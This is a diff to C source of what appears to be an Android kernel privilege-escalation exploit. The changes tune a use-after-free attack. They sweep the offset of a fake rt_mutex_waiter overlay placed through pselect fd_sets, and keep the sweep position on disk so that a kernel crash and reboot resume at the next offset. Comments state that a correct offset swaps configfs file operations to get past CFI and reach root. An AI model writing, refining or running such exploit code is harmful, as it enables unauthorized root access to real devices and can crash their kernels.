@@ -90,14 +90,17 @@ static int pselect_put_global_word(
   }
 }
 
+/* Runtime fake-waiter shift, swept across attempts (see do_pselect_fake_lock_route).
+ * shift=-2 lands the overlay BELOW the freed rt_waiter (tree_entry/lock read from
+ * residual real data -> survives, but RB_EMPTY_NODE early-returns -> no write). The
+ * aligning shift (overlay word0 lands on rt_waiter+0) is unknown; sweep [-2..+2]
+ * (buffer floor -2 / ceil +2 for 11 words 2..12) to find it. */
+int pselect_runtime_shift = PSELECT_WAITER_WORD_SHIFT;
+
 static void pselect_put_waiter_word(
     fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
     int waiter_word, uint64_t value, const char *name) {
-  /* Apply PSELECT_WAITER_WORD_SHIFT so the fake waiter aligns with the freed
-   * rt_mutex_waiter's stack slot. Both objects sit at SP_DIV-0x210, but the
-   * table starts the waiter at stack_fds+0x10 (word 2); shift=-2 moves word 2
-   * -> long 0 to match. Previously the macro was defined but never applied. */
-  int global_word = waiter_word + PSELECT_WAITER_WORD_SHIFT;
+  int global_word = waiter_word + pselect_runtime_shift;
   int placed = pselect_put_global_word(
       in, out, ex, words_per_set, global_word, value);
   if (!placed) {
@@ -170,6 +173,58 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   }
 }
 
+/* Shift sweep, reboot-resumable. A misaligned shift may Oops the kernel (the
+ * walk derefs a garbage waiter->lock), so persist the next sweep index to a file
+ * next to the log: a reboot resumes at the NEXT shift instead of re-crashing the
+ * same one. -2 first (known-survivable), then out toward the crash boundary. */
+static const int kShiftSweep[] = {-2, -1, 0, 1, 2};
+#define SHIFT_SWEEP_N ((int)(sizeof(kShiftSweep) / sizeof(kShiftSweep[0])))
+
+static void shift_idx_path(char *out, size_t n) {
+  const char *log = getenv("POC_LOG_FILE");
+  if (log && log[0]) {
+    snprintf(out, n, "%s.shiftidx", log);
+  } else {
+    snprintf(out, n, "/data/local/tmp/aristotle_shiftidx");
+  }
+}
+
+static int shift_idx_load(void) {
+  char path[288];
+  shift_idx_path(path, sizeof(path));
+  int fd = open(path, O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return 0;
+  }
+  char buf[16] = {0};
+  ssize_t r = read(fd, buf, sizeof(buf) - 1);
+  close(fd);
+  if (r <= 0) {
+    return 0;
+  }
+  int v = atoi(buf);
+  if (v < 0) {
+    v = 0;
+  }
+  return v % SHIFT_SWEEP_N;
+}
+
+static void shift_idx_store(int next) {
+  char path[288];
+  shift_idx_path(path, sizeof(path));
+  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
+  if (fd < 0) {
+    return;
+  }
+  char buf[16];
+  int n = snprintf(buf, sizeof(buf), "%d", next % SHIFT_SWEEP_N);
+  if (n > 0) {
+    (void)!write(fd, buf, (size_t)n);
+    fsync(fd);
+  }
+  close(fd);
+}
+
 void do_pselect_fake_lock_route(void) {
   /* Durable entry checkpoint: proves the waiter actually reached the
    * pselect route (the setup pr_info below is NOT fsync'd and is lost on
@@ -188,8 +243,17 @@ void do_pselect_fake_lock_route(void) {
   int success = 0;
   int route_verified = 0;
   int signal_miss_retry = 0;
+  int sweep_idx = shift_idx_load();
   for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
        route_attempt++) {
+    /* Pick the next shift and PERSIST the following index (fsync) BEFORE arming,
+     * so if this shift Oopses the kernel the reboot resumes at the next one. A
+     * signal-miss retry reuses the same shift (no walk happened). */
+    if (!signal_miss_retry) {
+      pselect_runtime_shift = kShiftSweep[sweep_idx % SHIFT_SWEEP_N];
+      shift_idx_store((sweep_idx + 1) % SHIFT_SWEEP_N);
+      sweep_idx++;
+    }
     /* On a signal-miss retry the payload page is still intact (no write
      * happened), so skip the expensive re-groom and just re-run pselect. */
     if (route_attempt != 1 && !signal_miss_retry) {
@@ -266,7 +330,7 @@ void do_pselect_fake_lock_route(void) {
      * shows "arming" for attempt N with no matching "survived", that attempt
      * panicked the kernel. */
     pr_success("ckpt: pselect attempt=%d arming shift=%d (consumer firing)\n",
-               route_attempt, PSELECT_WAITER_WORD_SHIFT);
+               route_attempt, pselect_runtime_shift);
     errno = 0;
     int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
     int saved_errno = errno;
@@ -322,6 +386,12 @@ void do_pselect_fake_lock_route(void) {
         cfi_last_step = 32;
       }
     }
+    /* Durable per-attempt sweep result ([+], flood-free). success=1 => the walk
+     * actually fired; landed=1 (configfs write != EINVAL) => the fops swap took
+     * at THIS shift => this is the aligning shift and root proceeds. */
+    pr_success("ckpt: SWEEP attempt=%d shift=%d success=%d landed=%d cfi_write_ret=%zd\n",
+               route_attempt, pselect_runtime_shift, success,
+               (int)(route_signal && cfi_write_ret > 0), cfi_write_ret);
     if (!route_verified && route_signal) {
       route_quality_miss = 1;
       if (!cfi_probed) {
